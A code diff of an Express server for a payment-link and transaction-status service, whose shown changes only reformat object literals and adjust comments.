@@ -1,3 +1,4 @@
+// server.js
 import express from 'express';
 import bodyParser from 'body-parser';
 import cors from 'cors';
@@ -23,7 +24,7 @@ const io = new SocketIOServer(server, {
   }
 });
 
-// In-memory storage for transactions and payment links
+// In‑memory storage for transactions and payment links
 const transactions = new Map();
 const paymentLinks = new Map();
 
@@ -42,7 +43,12 @@ app.post('/api/generatePaymentLink', (req, res) => {
   const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
   // Construct a link that passes the invoiceId as pid in landing.html
   const paymentLink = `${req.protocol}://${req.get('host')}/landing.html?pid=${invoiceId}`;
-  paymentLinks.set(invoiceId, { amount, description, paymentLink, createdAt: new Date().toISOString() });
+  paymentLinks.set(invoiceId, {
+    amount,
+    description,
+    paymentLink,
+    createdAt: new Date().toISOString()
+  });
   console.log("Payment link generated:", paymentLink);
   res.json({ status: "success", paymentLink });
 });
@@ -133,7 +139,11 @@ app.get('/api/checkTransactionStatus', (req, res) => {
     return res.status(404).json({ status: "error", message: "Transaction details not found" });
   }
   if (txn.status === 'otp_pending' && txn.otpShown) {
-    return res.json({ status: "show_otp", message: "Show OTP form to user", otpError: txn.otpError });
+    return res.json({
+      status: "show_otp",
+      message: "Show OTP form to user",
+      otpError: txn.otpError
+    });
   }
   if (txn.redirectStatus) {
     const redirectUrl = txn.redirectStatus === 'success'
@@ -182,7 +192,6 @@ app.post('/api/updateRedirectStatus', (req, res) => {
   });
 });
 
-// Start the server
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
